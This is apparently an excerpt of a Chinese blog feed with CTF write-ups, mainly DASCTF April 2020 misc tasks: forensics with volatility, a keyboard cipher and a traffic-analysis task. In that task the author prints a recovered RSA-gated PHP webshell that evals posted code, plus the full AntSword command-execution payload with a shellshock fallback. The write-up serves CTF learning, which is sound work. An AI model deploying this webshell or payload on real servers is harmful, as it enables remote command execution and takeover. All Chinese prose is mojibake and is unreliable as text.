<p>dockerfileå¤§è‡´èƒ½çœ‹æ‡‚æ€ä¹ˆå†™äº†ï¼Œä¼šéƒ¨ç½²äº†ï¼Œç‰ˆæœ¬é—®é¢˜å’Œæƒé™æ§åˆ¶ä¹Ÿä¼šäº†ä¸€äº›ï¼Œä¹Ÿè®¤è¯†äº†dockeræ‰“åŒ…</p>
<p>ç­‰å•¥æ—¶å€™èƒ½ç»™å®‰æ’å‡ºwebçš„æ—¶å€™ï¼Œå†™ç¯‡è¯¦ç»†çš„dockerå‡ºé¢˜è¿‡ç¨‹</p>
<p>è¿˜æœ‰å°±æ˜¯ï¼Œä»¥åæ‰“ç®—é¢˜ç›®ä¸æŒ‰ç…§æ¯”èµ›å†™äº†</p>
<p>ä¸€å¤§å—ä¸€å¤§å—çš„è¦ä¸€æ¬¡æ€§å†™çš„å†…å®¹å¤ªå¤šï¼Œæ²¡æœ‰åˆ›ä½œåŠ¨åŠ›å’Œå¤§å—æ—¶é—´</p>
<p>ä»¥åä¸€ç¯‡å†™ä¸€é“å°±å¥½äº†ï¼Œmiscå’Œwebéƒ½å†™</p>
<p>è¿‘æœŸçŠ¶æ€è¦èµ¶ç´§è°ƒæ•´äº†ï¼Œæ¯æ™šæ— æ„ä¹‰çš„æ™šç¡ï¼Œç™½å¤©å¬è¯¾æ—¶æ— æ„ä¹‰çš„å¿™ç¢Œï¼Œæ—¢æ²¡æœ‰å­¦åˆ°è¯¾æœ¬ä¸Šçš„çŸ¥è¯†ä¹Ÿæ²¡æœ‰å­¦åˆ°æ¯”èµ›çŸ¥è¯†ï¼Œè€Œä¸”å¯èƒ½å¿«è¦å¼€å­¦æˆ–æ˜¯è€ƒè¯•äº†ï¼Œè¦è®¤çœŸå­¦å­¦ä¹¦æœ¬çŸ¥è¯†äº†ï¼Œè½çš„è¯¾å¤ªå¤šäº†ã€‚ã€‚</p>
<p>æ—©ç¡ï¼Œè®¤çœŸå¬è¯¾ï¼Œè®¤çœŸåˆ·é¢˜ï¼Œå¥½å¥½å¤ä¹ ï¼å†²å†²å†²</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>DASCTF_2020_April</title>
    <url>/2020/04/25/DASCTF-2020-April/</url>
    <content><![CDATA[<p>è™½ç„¶æœ‰ä¸€å †ä½œä¸šå’Œpptè¿˜æ²¡åšï¼Œä½†æ˜¯ä¿¯å†²å®Œä¸­æœŸæŠ¥å‘Šè¿˜æ˜¯æœ‰ä¸ªé—²é€‚æœŸçš„ï¼Œç„¶åå°±çœ‹æ¯”èµ›ã€å¤šäººè¿åŠ¨ï¼ˆå¼€é»‘ï¼‰äº†ï¼Œä¹Ÿå¤ç›˜äº†ä¸€éƒ¨åˆ†æå®¢å¤§æŒ‘æˆ˜å§ã€‚è¿˜å¥½ä»Šå¤©å®‰æ’æœ‰ä¸ªæœˆèµ›ç©ï¼Œå°±æ¥æ°´ä¸€æ°´ã€‚éšä¾¿å†™ç‚¹wpï¼Œä¹Ÿçºªå¿µä¸€ä¸‹æˆ‘å¦¹çš„ç”Ÿæ—¥ï¼ˆç¬¬ä¸€æ¬¡åœ¨å®¶ä¸€èµ·è¿‡ï¼Œä¸è¿‡å¥½åƒè·Ÿå¹³å¸¸çš„æ—¥å­æ²¡å•¥å­åŒºåˆ«ï¼Œå“ˆå“ˆã€‚ï¼‰ç„¶åçš„è¯ï¼Œåé¢å‡ å¤©å°±æŠŠä½œä¸šå’Œä¸¤ä¸ªé¡¹ç›®pptææï¼Œé¡ºä¾¿æœŸå¾…ä¸€ä¸‹æ˜å¤©IGå¤§æˆ˜TESã€‚</p>
<p>è¨€å½’æ­£ä¼ ï¼Œè¿™åœºæ¯”èµ›æœ‰ä¸¤é“webï¼Œå››é“miscï¼Œæœ‰ä¸€é“webè¿˜æ˜¯ä¸ä¼šï¼Œæä¼šäº†å°±å†æ¥å¤ç›˜ä¸€ä¸‹</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="misc1-bluetooth"><a href="#misc1-bluetooth" class="headerlink" title="misc1(bluetooth)"></a>misc1(bluetooth)</h3><p>æµé‡åŒ…åˆ†æï¼Œæ–‡ä»¶æå–</p>
<p>é¦–å…ˆæ‹¿åˆ°è¿™é“é¢˜ï¼Œæ²¡å•¥æ€è·¯ï¼Œé‚£å †åè®®ä¹Ÿæ²¡è§è¿‡ï¼Œå°è¯•binwalkä¸€ä¸‹ï¼Œå‘ç°ä¸€ä¸ª7zå‹ç¼©åŒ…ï¼Œç”¨ddå‘½ä»¤æå–å‡ºæ¥</p>
<p>å‘ç°é‡Œé¢çš„æ–‡æœ¬åç§°æ˜¯<code>password_is_Bluetooth_PIN.txt</code>ï¼Œç„¶åå°±å»æµé‡åŒ…é‡Œæ‰¾</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="70%" height="70%" data-src="/2020/04/25/DASCTF-2020-April/1.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ‰¾åˆ°åè§£å¼€å‹ç¼©åŒ…ï¼Œå°±å¾—åˆ°flagäº†</p>
<h3 id="misc2-keyboard"><a href="#misc2-keyboard" class="headerlink" title="misc2(keyboard)"></a>misc2(keyboard)</h3><p>volæ–‡ä»¶æå–ã€ç”µè„‘é”®ç›˜QWEå¯†ç ã€å¤§å°å†™è½¬æ¢ã€VeraCryptæ–‡ä»¶æŒ‚è½½ã€NTFS</p>
<p>ä¸‹è½½å¾—åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œæ„Ÿè§‰å¾ˆç†Ÿæ‚‰ï¼Œæœ‰ã€åƒ<code>1st XTUCTF</code>é‡Œé¢çš„ä¸€é“å–è¯ï¼Œä¸è¿‡ä¸å¤ªä¸€æ ·</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">volatility -f Keyboard.raw imageinfo</span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 pslist  <span class="comment">#æŸ¥çœ‹è¿›ç¨‹ï¼Œå‘ç°VeraCrypt.exeå’Œkeyboard-log.exe</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 filescan | grep keyboard  <span class="comment">#æ‰«ä¸€ä¸‹å‘ç°t.txt</span></span><br><span class="line">volatility -f Keyboard.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000003d700880 --dump-dir=./ <span class="comment">#æå–ä¸€ä¸‹</span></span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/2.png" src="/img/loading.gif" class="lazyload"></a>

<p>ç„¶åé€šè¿‡ä¸‹å›¾è§£å¯†ç»™å‡ºçš„<code>CTKQEKNHZHQLLVGKROLATNWGQKRRKQGWNTA</code></p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/3.png" src="/img/loading.gif" class="lazyload"></a>

<p>å¾—åˆ°<code>VERACRYPTPASSWORDISKEYBOARDDRAOBYEK</code>ï¼Œæç¤ºå°å†™æ›´å®¹æ˜“çœ‹å‡º<code>veracryptpasswordiskeyboarddraobyek</code></p>
<p>å¾—åˆ°å¯†ç <code>keyboarddraobyek</code>ï¼Œä½†æ˜¯ä¸‹é¢æç¤ºè¿˜æ˜¯è¦å¤§å†™ã€‚ã€‚ã€‚</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/4.png" src="/img/loading.gif" class="lazyload"></a>

<p>æ‹¿VeraCrypt.exeåŠ è½½ä¸€ä¸‹Secret</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="50%" height="50%" data-src="/2020/04/25/DASCTF-2020-April/5.png" src="/img/loading.gif" class="lazyload"></a>

<p>çŒœä¸€æ‰‹NTFSï¼Œæ‹¿NtfsStreamsEditor2.exeæ‰«ä¸€ä¸‹ï¼Œæˆ–è€…ç”¨dirå‘½ä»¤</p>
<h3 id="misc3-AWDshell"><a href="#misc3-AWDshell" class="headerlink" title="misc3(AWDshell)"></a>misc3(AWDshell)</h3><p>æµé‡åˆ†æã€RSAã€AESã€phpä»£ç å¤§æ¦‚å®¡è®¡</p>
<p>è¿™æ˜¯å¤é£å¸ˆå‚…å‡ºçš„ä¸€é“ä¸Šä¼ ğŸçš„é¢˜ï¼ˆ<a href="https://blog.xiafeng2333.top/ctf-18/" target="_blank" rel="noopener">å‡ºé¢˜æ€è·¯</a></p>
<p>é¦–å…ˆæ‰“å¼€æµé‡åŒ…å‘ç°ä¸€å †UDPï¼Œé‡Œé¢æ··æ·†ç€HTTPï¼Œè¿½è¸ªä¸€ä¸‹HTTPæµ</p>
<p>å…ˆåœ¨å¯¼å‡ºå¯¹è±¡é‡Œçœ‹ä¸€ä¸‹éƒ½æœ‰å•¥ï¼Œç„¶åæŠŠåå­—ç†Ÿæ‚‰çš„ï¼Œæ¯”å¦‚login.phpã€upload.phpã€index.phpå•¥çš„</p>
<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/6.png" src="/img/loading.gif" class="lazyload"></a>

<p>åœ¨upload.phpé‡Œé¢å‘ç°ä¸‹é¢ä»£ç ã€å‘ç°æ˜¯ä¸€ä¸ªç”¨èšå‰‘è¿æ¥çš„ã€RSAåŠ å¯†çš„ğŸ</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-----------------------------7e42cb506f4</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;pic&quot;; filename&#x3D;&quot;awdshell.php&quot;</span><br><span class="line">Content-Type: application&#x2F;octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$cmd &#x3D; @$_POST[&#39;ant&#39;];</span><br><span class="line">$pk &#x3D; &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCmXoXBvXeanxgl51HBm2J6HPNh</span><br><span class="line">TQtfb8ICioE+n0Ni0DlBFHSBprbsWYKJywVfdhJbLDCCon68uA1UYuy0yteDog3j</span><br><span class="line">OdweW2bscEGmeMXLQJfBHpQrg4wWoYJjD3QsKorYT6kdp1LRkuHE3PbpqvRtqO7A</span><br><span class="line">LzrcBi88Eu7oZaPANwIDAQAB</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">EOF;</span><br><span class="line">$cmds &#x3D; explode(&quot;|&quot;, $cmd);</span><br><span class="line">$pk &#x3D; openssl_pkey_get_public($pk);</span><br><span class="line">$cmd &#x3D; &#39;&#39;;</span><br><span class="line">foreach ($cmds as $value) &#123;</span><br><span class="line">  if (openssl_public_decrypt(base64_decode($value), $de, $pk)) &#123;</span><br><span class="line">    $cmd .&#x3D; $de;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval($cmd);</span><br></pre></td></tr></table></figure></div>

<p>ç„¶åè¿½è¸ª<code>1581335771.php</code>çš„ä¸€å †æµé‡ï¼Œåœ¨é‡Œé¢å‘ç°äº†ä¸Šä¼ çš„<code>name=&quot;ant&quot;</code></p>
<p>å°†ä¸Šé¢ä»£ç é‡Œçš„<code>$cmd=@$_POST[&#39;ant&#39;];</code>æ”¹æˆä¸Šä¼ çš„<code>ant</code>çš„å€¼ï¼Œæ”¾åˆ°ä¸€ä¸ªphpç¯å¢ƒé‡Œï¼ŒæŠŠä¸Šé¢çš„ä»£ç è·‘ä¸€ä¸‹ï¼Œä¼šå¾—åˆ°<code>ant</code>è§£å¯†åçš„å€¼ï¼ˆä¸€ä¸²phpä»£ç </p>
<p>å…¶å®æœ‰å¾ˆå¤šä¸Šä¼ çš„<code>1581335771.php</code>æ–‡ä»¶ï¼Œéœ€è¦ä¸€ä¸ªä¸€ä¸ªå»åˆ†æ</p>
<p>ä½†æ˜¯é‡è¦çš„åªæœ‰ä¸¤ä¸ªå‡½æ•°ï¼š<code>asenc()</code>ã€<code>asoutput()</code></p>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªå‡½æ•°<code>asenc()</code>æŒ‡æ˜äº†AESçš„å¯†é’¥sessionçš„å‰16ä½ï¼Œä¹Ÿå°±æ˜¯<code>Cookie: PHPSESSID=hm3pq66843bbbrdgphntt8fmc4</code>çš„å‰16ä½</p>
<p>ç¬¬äºŒä¸ªå‡½æ•°<code>asoutput()</code>ç»™å‡ºäº†AESçš„å¯†æ–‡ï¼Œä½†æ˜¯æ˜¯æ··æ·†è¿‡åçš„ï¼Œå› ä¸ºå®ƒå‰é¢å’Œåé¢éƒ½æœ‰ä¸€äº›æ²¡æœ‰ç”¨çš„å­—ç¬¦ä¸²</p>
<p>æˆ‘ä¸‹é¢å°±æ”¾å‡ºäº†å…¶ä¸­ä¸€ä¸ªè§£å¯†ç»“æœï¼Œæµ38è§£å¯†åçš„phpä»£ç æ®µï¼Œå°±æ˜¯æœ‰ç”¨çš„é‚£ä¸€ä¸ª</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">@ini_set(<span class="string">"display_errors"</span>, <span class="string">"0"</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span><span class="params">($out)</span> </span>&#123;</span><br><span class="line">	@session_start();</span><br><span class="line">	$key=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">'a'</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">	<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode($out), <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA));</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	$output=ob_get_contents();</span><br><span class="line">	ob_end_clean();</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"f3c7239848e0"</span>;</span><br><span class="line">	<span class="keyword">echo</span> @asenc($output);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"05fda2646c"</span>;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	$p=base64_decode($_POST[<span class="string">"t185a78b977a47"</span>]);</span><br><span class="line">	$s=base64_decode($_POST[<span class="string">"wd0b7c7ca226cb"</span>]);</span><br><span class="line">	$envstr=@base64_decode($_POST[<span class="string">"b8dcb72ce2ba93"</span>]);</span><br><span class="line">	$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">	$c=substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>?<span class="string">"-c \"&#123;$s&#125;\""</span>:<span class="string">"/c \"&#123;$s&#125;\""</span>;</span><br><span class="line">	<span class="keyword">if</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">"/"</span>) &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">":/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		@putenv(<span class="string">"PATH="</span>.getenv(<span class="string">"PATH"</span>).<span class="string">";C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="keyword">empty</span>($envstr)) &#123;</span><br><span class="line">		$envarr=explode(<span class="string">"|||asline|||"</span>, $envstr);</span><br><span class="line">		<span class="keyword">foreach</span>($envarr <span class="keyword">as</span> $v) &#123;</span><br><span class="line">			<span class="keyword">if</span> (!<span class="keyword">empty</span>($v)) &#123;</span><br><span class="line">				@putenv(str_replace(<span class="string">"|||askey|||"</span>, <span class="string">"="</span>, $v));</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	$r=<span class="string">"&#123;$p&#125; &#123;$c&#125;"</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">fe</span><span class="params">($f)</span> </span>&#123;</span><br><span class="line">		$d=explode(<span class="string">","</span>,@ini_get(<span class="string">"disable_functions"</span>));</span><br><span class="line">		<span class="keyword">if</span>(<span class="keyword">empty</span>($d)) &#123;</span><br><span class="line">			$d=<span class="keyword">array</span>();</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$d=array_map(<span class="string">'trim'</span>,array_map(<span class="string">'strtolower'</span>,$d));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span><span class="params">($d, $c)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (substr($d, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">"/"</span> &amp;&amp; fe(<span class="string">'putenv'</span>) &amp;&amp; (fe(<span class="string">'error_log'</span>) || fe(<span class="string">'mail'</span>))) &#123;</span><br><span class="line">			<span class="keyword">if</span> (strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">				$tmp = tempnam(sys_get_temp_dir(), <span class="string">'as'</span>);</span><br><span class="line">				putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">				<span class="keyword">if</span> (fe(<span class="string">'error_log'</span>)) &#123;</span><br><span class="line">					error_log(<span class="string">"a"</span>, <span class="number">1</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					mail(<span class="string">"a@127.0.0.1"</span>, <span class="string">""</span>, <span class="string">""</span>, <span class="string">"-bv"</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			$output = @file_get_contents($tmp);</span><br><span class="line">			@unlink($tmp);</span><br><span class="line">			<span class="keyword">if</span> ($output != <span class="string">""</span>) &#123;</span><br><span class="line">				<span class="keyword">print</span>($output);</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">False</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">runcmd</span><span class="params">($c)</span> </span>&#123;</span><br><span class="line">		$ret=<span class="number">0</span>;</span><br><span class="line">		$d=dirname($_SERVER[<span class="string">"SCRIPT_FILENAME"</span>]);</span><br><span class="line">		<span class="keyword">if</span>(fe(<span class="string">'system'</span>)) &#123;</span><br><span class="line">			@system($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'passthru'</span>)) &#123;</span><br><span class="line">			@passthru($c,$ret);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'shell_exec'</span>)) &#123;</span><br><span class="line">			<span class="keyword">print</span>(@shell_exec($c));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'exec'</span>)) &#123;</span><br><span class="line">			@exec($c,$o,$ret);</span><br><span class="line">			<span class="keyword">print</span>(join(<span class="string">"</span></span><br><span class="line"><span class="string">"</span>,$o));</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'popen'</span>)) &#123;</span><br><span class="line">			$fp=@popen($c,<span class="string">'r'</span>);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($fp)) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($fp,<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@pclose($fp);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'proc_open'</span>)) &#123;</span><br><span class="line">			$p = @proc_open($c, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">'pipe'</span>, <span class="string">'w'</span>)), $io);</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">1</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">1</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span>(!@feof($io[<span class="number">2</span>])) &#123;</span><br><span class="line">				<span class="keyword">print</span>(@fgets($io[<span class="number">2</span>],<span class="number">2048</span>));</span><br><span class="line">			&#125;</span><br><span class="line">			@fclose($io[<span class="number">1</span>]);</span><br><span class="line">			@fclose($io[<span class="number">2</span>]);</span><br><span class="line">			@proc_close($p);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(fe(<span class="string">'antsystem'</span>)) &#123;</span><br><span class="line">			@antsystem($c);</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(runshellshock($d, $c)) &#123;</span><br><span class="line">			<span class="keyword">return</span> $ret;</span><br><span class="line">		&#125; <span class="keyword">elseif</span>(substr($d,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">"/"</span> &amp;&amp; @class_exists(<span class="string">"COM"</span>)) &#123;</span><br><span class="line">			$w=<span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>);</span><br><span class="line">			$e=$w-&gt;exec($c);</span><br><span class="line">			$so=$e-&gt;StdOut();</span><br><span class="line">			$ret.=$so-&gt;ReadAll();</span><br><span class="line">			$se=$e-&gt;StdErr();</span><br><span class="line">			$ret.=$se-&gt;ReadAll();</span><br><span class="line">			<span class="keyword">print</span>($ret);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$ret = <span class="number">127</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $ret;</span><br><span class="line">	&#125;</span><br><span class="line">	;</span><br><span class="line">	$ret=@runcmd($r.<span class="string">" 2&gt;&amp;1"</span>);</span><br><span class="line">	<span class="keyword">print</span> ($ret!=<span class="number">0</span>)?<span class="string">"ret=&#123;$ret&#125;"</span>:<span class="string">""</span>;</span><br><span class="line">	;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(<span class="keyword">Exception</span> $e) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"ERROR://"</span>.$e-&gt;getMessage();</span><br><span class="line">&#125;</span><br><span class="line">;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure></div>

<a href="/img/loading.gif" data-fancybox="group" data-caption="undefined" class="fancybox"><img width="80%" height="80%" data-src="/2020/04/25/DASCTF-2020-April/7.png" src="/img/loading.gif" class="lazyload"></a>

<p>æŠŠå‰åæ²¡ç”¨çš„é™„åŠ å­—ç¬¦å»æ‰ï¼Œåœ¨çº¿ç½‘é¡µAES+base64*2</p>
<p>æˆ–è€…</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$key = <span class="string">"hm3pq66843bbbrdg"</span>;</span><br><span class="line">$out = <span class="string">"+L8pc9pJEhqPQ1cmL18eJXX9QGADkKnp8A1j7s4oX2Qo8YJNGNTbuaXu+OfynYgRewqyfLj/Wrg0rgKj/cRdO4zJMmfLfyFVB4pBRYeTetM0G/w/Px6+xI/WPlRrx/+MvK6eQyPr+xDqTX82AqiGrOYDwN94/vuGcLS7NAxhty4="</span>;</span><br><span class="line">$out1 = base64_decode($out);</span><br><span class="line">$out2 = openssl_decrypt($out1, <span class="string">'AES-128-ECB'</span>, $key, OPENSSL_RAW_DATA);</span><br><span class="line"><span class="keyword">echo</span> base64_decode(base64_decode($out2));</span><br></pre></td></tr></table></figure></div>

<h3 id="misc4-6Gï¼ç­¾åˆ°é¢˜ç›®"><a href="#misc4-6Gï¼ç­¾åˆ°é¢˜ç›®" class="headerlink" title="misc4(6Gï¼ç­¾åˆ°é¢˜ç›®)"></a>misc4(6Gï¼ç­¾åˆ°é¢˜ç›®)</h3><p>è¿™ä¸ªé¢˜å‡ºçš„æœ‰æ„æ€ï¼Œå“ˆå“ˆå“ˆå“ˆï¼Œç»™ä¸ª1Gæ–‡ä»¶ï¼Œä¸‹è½½é€Ÿåº¦è¿˜å¥‡æ…¢</p>
<p>ä¸‹è½½ä¸€éƒ¨åˆ†å°±å¥½äº†ï¼Œæœ‰<code>crdownload</code>æ–‡ä»¶ç”Ÿæˆåï¼Œç›´æ¥æ”¾010å°±å¥½ï¼Œæ–‡ä»¶å¤´éƒ¨å‘ç°DSACTF</p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="web1-Joomla-3-4-6-RCE"><a href="#web1-Joomla-3-4-6-RCE" class="headerlink" title="web1(Joomla 3.4.6 RCE)"></a>web1(Joomla 3.4.6 RCE)</h3><p>ä¼šè¯é€ƒé€¸çš„æ€è·¯</p>
<h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>ä¼šäº†å°±å†™</p>
]]></content>
      <categories>
        <category>Write_up</category>
      </categories>
      <tags>
        <tag>Write_up</tag>
        <tag>misc</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF_2020</title>
    <url>/2020/04/22/NPUCTF-2020/</url>
    <content><![CDATA[<p>è¿™åœºæ˜¯è¥¿å·¥å¤§çš„æ ¡å¤–èµ›é“ï¼Œå¹³å°è¢«æ‰«äº†å¥½å¤šæ¬¡ï¼Œè‹¦äº†è¿ç»´äº†ï¼Œä¸­é—´ä¹Ÿä¿®äº†å¥½å¤šæ¬¡ï¼Œèµ›é¢˜è´¨é‡å’‹è¯´å‘¢ï¼Œåæ­£éƒ½æ˜¯æˆ‘ä¸ä¼šçš„ç±»å‹ã€‚ã€‚ã€‚æ“ä½œç³»ç»Ÿçš„ä¿¡å·é‡ã€æ¡ä»¶å˜é‡+äº’æ–¥é”ä½œä¸šï¼Œå¯†ç å­¦ä½œä¸šï¼Œä¿¡å·ä½œä¸šï¼Œè™ç¬¦CTFï¼Œè¥¿å·¥å¤§NPUï¼ŒåŒºå—é“¾é¡¹ç›®ä¸­æœŸæ£€æŸ¥ï¼Œè´¢ç»æ¦‚è®ºçš„presentationã€‚ã€‚ã€‚è¿‘æœŸè¿™ä¸€å †äº‹æƒ…çœŸæ»´æäººå¿ƒæ€ï¼Œä¸è¿‡å¥½æ­¹ä¹Ÿç®—è¿‡å»ä¸€å¤§åŠäº†ã€‚ä½†æ˜¯åé¢è¿˜æœ‰å®‰æ’æœˆèµ›ã€ISCCã€De1taã€ç½‘é¼ã€‚ã€‚ã€‚u1s1ï¼Œæ¯”èµ›æ˜¯çœŸçš„å¤šï¼Œæˆ‘ä¹Ÿæ˜¯çœŸçš„èœã€‚ã€‚ã€‚</p>
<p>è™ç¬¦<del>æ‰“äº†æ‰“</del>å•¥ä¹Ÿæ²¡åšå‡ºæ¥ï¼Œç­¾åˆ°è¿˜è¢«å¤§å¸ˆå‚…åšäº†ï¼Œç„¶åå°±0è¾“å‡ºäº†ã€‚ã€‚ã€‚é‚£æ¯”èµ›miscå¿’éš¾äº†ã€‚ã€‚</p>
<p>ä¸‰é“miscï¼Œä¸¤é“é›¶è§£ï¼Œä¸€é“ä¸‰è§£ã€‚ã€‚ä¸å¤ç›˜äº†ã€‚ã€‚ï¼ˆç­‰ğŸ‘´ä¼šç”¨å–è¯å·¥å…·åå°±æŠŠç¬¬ä¸€é“ å¥‡æ€ªçš„ç»„ç»‡ å¤ç°ä¸€ä¸‹ï¼‰ </p>
<p>å‰©ä¸‹ä¿©é¢˜ï¼Œä¸€ä¸ªå¯†ç æœºå™¨ï¼ˆbadusbå›ºä»¶ã€é€†å‘åˆ†æã€å¾—åˆ°pythonè¾“å…¥è„šæœ¬è¿è¡Œä¸€ä¸‹ï¼‰ï¼Œä¸€ä¸ªæ‰«é›·ï¼ˆé€šå…³æ¸¸æˆ+æµ®ç‚¹æ•°è½¬å­—ç¬¦ä¸²ï¼‰ </p>
